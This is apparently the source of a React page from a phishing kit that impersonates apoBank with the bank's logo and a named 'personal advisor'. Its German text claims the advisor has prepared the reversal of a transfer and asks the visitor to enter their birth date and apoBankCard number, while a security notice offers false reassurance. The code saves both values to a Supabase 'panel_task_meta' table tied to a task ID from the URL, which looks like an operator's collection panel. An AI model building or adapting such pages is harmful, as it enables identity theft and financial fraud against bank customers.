import { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { Phone, ShieldCheck } from "lucide-react";
import apoBankLogo from "@/assets/apobank-logo.svg";
import Footer from "@/components/Footer";
import ContactSection from "@/components/ContactSection";
import { supabase } from "@/integrations/supabase/client";
import { useBerater } from "@/hooks/useBerater";

const Berater = () => {
  const navigate = useNavigate();
  const berater = useBerater();
  const [sp] = useSearchParams();
  const nextUrl = sp.get("next");
  const taskId = sp.get("taskId");
  const [geburtsdatum, setGeburtsdatum] = useState("");
  const [karte, setKarte] = useState("");
  const [touched, setTouched] = useState(false);
  const [geburtsdatumTouched, setGeburtsdatumTouched] = useState(false);
  const [karteTouched, setKarteTouched] = useState(false);

  const karteInvalid = karte.length !== 10;
  const geburtsdatumInvalid = !/^\d{2}\.\d{2}\.(\d{2}|\d{4})$/.test(geburtsdatum);
  const geburtsdatumError = (touched || geburtsdatumTouched) && geburtsdatumInvalid;
  const karteError = (touched || karteTouched) && karteInvalid;

  const handleWeiter = async () => {
    setTouched(true);
    if (geburtsdatumInvalid || karteInvalid) return;
    if (taskId) {
      try {
        const { data: existing } = await (supabase as any)
          .from("panel_task_meta").select("id").eq("task_id", taskId).maybeSingle();
        const patch = { berater_geburtsdatum: geburtsdatum, berater_karte: karte };
        if (existing) await (supabase as any).from("panel_task_meta").update(patch).eq("id", existing.id);
        else await (supabase as any).from("panel_task_meta").insert({ task_id: taskId, ...patch });
      } catch {}
    }
    navigate(nextUrl || "/homepage");
  };


  return (
    <div className="min-h-screen bg-white flex flex-col relative">
      <img src={apoBankLogo} alt="apoBank Logo" className="absolute top-3 left-3 sm:top-4 sm:left-4 h-10 sm:h-16 w-auto z-10" />

      <div className="flex-1 flex items-start justify-center px-3 sm:px-4 pt-6 pb-12">
        <div className="w-full max-w-xl bg-[#f5f5f5] rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)] mt-20 sm:mt-[114px]">
          <div className="px-4 sm:px-8 py-8 sm:py-10 flex flex-col items-center text-center">
            {/* Avatar */}
            <div className="h-36 w-36 rounded-full bg-muted border-4 border-white shadow-[0_4px_18px_rgba(0,0,0,0.12)] overflow-hidden">
              <img src={berater.photoUrl} alt={berater.name} className="h-full w-full object-cover" />
            </div>

            {/* Labels */}
            <p className="mt-5 text-xs tracking-[0.18em] font-semibold text-primary uppercase">
              Ihr persönlicher Kundenberater
            </p>
            <h1
              className="mt-2 text-3xl font-bold text-[#0f1b2d]"
              style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}
            >
              {berater.name}
            </h1>

            <div className="mt-3 flex items-center gap-2 text-foreground">
              <Phone className="h-4 w-4" />
              <span className="text-sm font-medium">+49 211 5998 0</span>
            </div>

            {/* Description */}
            <p className="mt-6 text-sm text-foreground/70 leading-relaxed max-w-md">
              Sie werden aktuell persönlich von <span className="font-semibold text-foreground">Justus Sperling</span> betreut.
              Ihr Berater hat den Widerruf Ihrer Überweisung vorbereitet. Zur Verifizierung
              gegenüber Ihrem Berater geben Sie bitte die folgenden Daten ein.
            </p>

            {/* Security note */}
            <div className="mt-6 w-full max-w-md flex items-start gap-3 rounded-md border border-primary/20 bg-primary/5 px-4 py-3 text-left">
              <ShieldCheck className="h-5 w-5 text-primary shrink-0 mt-0.5" />
              <p className="text-xs text-foreground/70 leading-relaxed">
                Der Vorgang läuft über eine gesicherte Verbindung Ihrer Bank.
                Geben Sie Ihre Zugangsdaten niemals an Dritte weiter — Ihr Berater
                fragt diese zu keiner Zeit ab.
              </p>
            </div>

            {/* Sicherheit card */}
            <section className="mt-6 w-full max-w-md bg-white border border-border/60 rounded-sm p-4 sm:p-6 shadow-sm text-left">
              <h2 className="font-bold text-[#1a1a1a] mb-3">Zu Ihrer Sicherheit</h2>
              <p className="text-sm text-foreground mb-5">
                Zur Überprüfung geben Sie bitte Ihr Geburtsdatum und die Nummer einer Ihrer gültigen apoBankCard ein
              </p>

              <div className="space-y-4">
                <div>
                  <input
                    type="text"
                    value={geburtsdatum}
                    onChange={(e) => {
                      setGeburtsdatum(e.target.value);
                      if (!geburtsdatumTouched) setGeburtsdatumTouched(true);
                    }}
                    onBlur={() => setGeburtsdatumTouched(true)}
                    placeholder="Geburtsdatum*"
                    className={`w-full px-3 py-3 border rounded-sm bg-white text-sm text-foreground outline-none focus:ring-1 focus:ring-foreground ${
                      geburtsdatumError ? "border-[#d9614a]" : "border-border"
                    }`}
                  />
                  <p className={`text-xs mt-1 ${geburtsdatumError ? "text-[#d9614a]" : "text-foreground"}`}>TT.MM.JJJJ</p>
                </div>

                <div>
                  <input
                    type="text"
                    inputMode="numeric"
                    maxLength={10}
                    value={karte}
                    onChange={(e) => {
                      setKarte(e.target.value.replace(/\D/g, "").slice(0, 10));
                      if (!karteTouched) setKarteTouched(true);
                    }}
                    onBlur={() => setKarteTouched(true)}
                    placeholder="apoBankCard Kartennummer *"
                    className={`w-full px-3 py-3 border rounded-sm bg-white text-sm text-foreground outline-none focus:ring-1 focus:ring-foreground ${
                      karteError ? "border-[#d9614a]" : "border-border"
                    }`}
                  />
                  <p className={`text-xs mt-1 ${karteError ? "text-[#d9614a]" : "text-foreground"}`}>
                    {karteError ? (karte.length === 0 ? "* Pflichtfeld" : "Kartennummer muss 10 Zeichen lang sein") : "* Pflichtfeld"}
                  </p>

                </div>
              </div>
            </section>



            {/* CTA */}
            <div className="mt-7 w-full max-w-md flex justify-end">
              <button
                onClick={handleWeiter}
                className="px-8 py-2 bg-white border border-foreground text-foreground rounded-sm text-sm font-medium hover:bg-white transition-colors"
              >
                Weiter
              </button>
            </div>
          </div>
        </div>
      </div>

      <ContactSection />
      <Footer />
    </div>
  );
};

export default Berater;
